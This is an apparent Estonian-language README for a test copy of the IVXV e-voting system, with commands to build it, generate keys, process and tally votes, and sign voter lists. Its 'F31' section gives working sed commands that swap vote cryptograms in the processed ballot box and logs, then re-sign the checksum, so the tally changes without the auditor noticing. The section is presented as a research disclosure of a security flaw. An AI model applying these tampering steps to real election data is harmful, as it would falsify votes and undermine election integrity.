# IVXV test dummy

Võtmete genereerimine (uute võtmete korral kaasapandud hääled enam ei tööta):

```
rm -r log initout dummy_card_filesystems
./key init -c conf/certs.asice -p conf/key.asice
```

Häälte töötlemine, dekrüptimine ja tulemuse kuvamine:

```
rm -r out-* decout
./processor checkAndSquash -c conf/certs.asice -p conf/processor.asice
digidoc-tool create --file=out-2/DUMMY-bb-2.json.sha256sum out-2/DUMMY-bb-2.json.sha256sum.asice
./processor revokeAndAnonymize -c conf/certs.asice -p conf/processor.asice
digidoc-tool create --file=out-4/DUMMY-bb-4.json.sha256sum out-4/DUMMY-bb-4.json.sha256sum.asice
./auditor integrity -c conf/certs.asice -p conf/auditor.asice
./key decrypt -c conf/certs.asice -p conf/key.asice
cat decout/DUMMY.question-DUMMY.tally
```

## Manipulatsioonid _à la_ Treier

Üldtausta vt [B. Fault Scenario Catalogue](https://ieeexplore.ieee.org/document/11271237#sec6b) ja [Teadlane pani Eesti e-hääletuse proovile ja leidis 12 kriitilist viga: kui süsteemi ei parandata, võib e-hääletus kinni minna](https://geenius.delfi.ee/artikkel/120450950/teadlane-pani-eesti-e-haaletuse-proovile-ja-leidis-12-kriitilist-viga-kui-susteemi-ei-parandata-voib-e-haaletus-kinni-minna).

Logikirjed on häälte Base64 vormigus krüptogrammide SHA-256 räsid Base64 vormingus, mida võib töödelda näiteks nii:

```
echo "..." | base64 -d | sha256sum | cut -d" " -f1 | xxd -r -p | base64
grep DUMMY.question-DUMMY out-2/DUMMY-bb-2.json | cut -d\" -f4 | xargs -n1 bash -c 'base64 -d <<<"$0" | sha256sum | cut -d" " -f1 | xxd -r -p | base64'
```

### F31: swapping an overridden (non-latest) e-vote’s cryptogram with another voter’s latest cryptogram from the same district

Nagu demonstreeritud [26.01.2026 Riigikogu korruptsioonikomisjonis](https://youtu.be/0MR4_eSaj5E?t=2484). Manipulatsioon toimub pärast konteinerite kehtivuse kontrolli ja korduvhäälte eemaldamist (käsk `checkAndSquash`) ning muudab hääletustulemust.

Enne:

```
    "0000.1" : {
      "0000.101" : 2,
      "0000.102" : 2,
      "invalid" : 0
    },
```

Pärast:

```
    "0000.1" : {
      "0000.101" : 2,
      "0000.102" : 1,
      "invalid" : 1
    },
```

Auditirakendus vigu ei anna.

```
sed -e "s|OuW1jJ/47pra5B2MHTUi5z2cBcJ2v50FNRk9gFsAGLg=/y8VhmeZyFAQh8ck|ri+IlehHcc8NK6mKraXW3+6SwH4=|" out-2/DUMMY.question-DUMMY.squash.log2
sed -e "s|MIHWMAsGCSsGAQQBho0fATCBxgRhBJ3fgzaJjsYZV8vy611JRFshd05WFyTMYvG8BicQN9fwpykSRhcZinVwBG1bQaBQF2oCswsZqgAc78lRfPgmM0f3Jyr7BxstX2lSDls6QwSKHHL8xPHwmxgEn1JA1TK90ARhBHJ8Y+XmYlfa2IWJ2dUOB5xzhwfaAy+Oj23ZDTZ9YlNwYPejDEpGFEM0rpXxcdRNHH16V2i4v8McXt+krCajmyW+yhHVFaN8Mq0tdeZdEfr1APwWW0yO3Qbb0H2/URhIWg==|MIHWMAsGCSsGAQQBho0fATCBxgRhBHc3F4HK+OrOO4PHb/fgvsFNLaCW8DbYmC2x6JMPXuyDcK/fCR7MTNx2OXIlLJcF5hMT1ISrtFnf21mif98yYU6AUuyPDFS+eOcqq2pA+oYvs+/WmrY4tCdXn4f9pKEhRgRhBDQSMZVodo27Cx6MUUx531fnkXRYrzX0kaFL7JZzf2EWPsdibaBrXl/ZcW+IGfCrTWwrFo/tXqBCWf1hdZJNvJDnBGv4pu3NceGkLxXK5fIom//voVXrzLINo9BJjXVrBw==|" out-2/DUMMY-bb-2.json
sha256sum out-2/DUMMY-bb-2.json | cut -d" " -f1 > out-2/DUMMY-bb-2.json.sha256sum
digidoc-tool create --file=out-2/DUMMY-bb-2.json.sha256sum out-2/DUMMY-bb-2.json.sha256sum.asice
```

## IVXV minimalistlik seadistamine

Võtme-, töötlemis- ja auditirakenduse töölesaamiseks eelnevalt:

```
git clone --recurse-submodules https://github.com/infoaed/ivxv-dummy.git
cd ivxv.dummy
git submodule update --init --recursive

sudo apt update
sudo apt install openjdk-21-jdk

wget https://services.gradle.org/distributions/gradle-8.11-bin.zip
unzip gradle-8.11-bin.zip -d ivxv/common/external
rm gradle-8.11-bin.zip

patch -d ivxv -p1 <disable_rs.patch

make -C ivxv processor auditor ONLINE=1
make -C ivxv key ONLINE=1 DEVELOPMENT=1
```

## Häälte lisamine valimiskasti

Hääli saab anda [käsurea valijarakendusega](https://github.com/infoaed/ivxv-roster) ja need peavad olema [õigesti pakendatud ZIP-failis](https://github.com/infoaed/ivxv-tools/blob/main/votepackage.py), millel on kontrollsumma ja kontrollsumma ise digiallkirjastatud.

```
./vote.py --local
./votepackage.py ivxv-dummy votes.zip
sha256sum votes.zip | cut -d" " -f1 > votes.zip.sha256sum
digidoc-tool create --file=votes.zip.sha256sum votes.zip.sha256sum.asice
```

## Valijate nimekirja tegemine

Normaaljuhul peaks piisama nimekirja redigeerimisest ja signeerimisest `openssl`-iga.

```
openssl ecparam -name prime256v1 -genkey -noout -out vl.pem
openssl ec -in vl.pem -pubout -out vl_pub.pem
openssl dgst -sha256 -sign vl.pem -out voterlist.txt.signature voterlist.txt
openssl dgst -sha256 -verify vl_pub.pem -signature voterlist.txt.signature voterlist.txt
```

## Kui konteiner "ei valideeru"

Kui mõni sertifikaat on puudu ja digiallkirjade kontroll ei õnnestu, nt allkirjastatud konteiner "ei valideeru", siis siit leiab:

* https://www.skidsolutions.eu/resources/certificates/

Tuleb puuduv sertifikaat lisada konteinerisse `certs.asice`, täiendada seal olevat faili `ivxv.properties` ja konteiner uuesti digiallkirjastada.
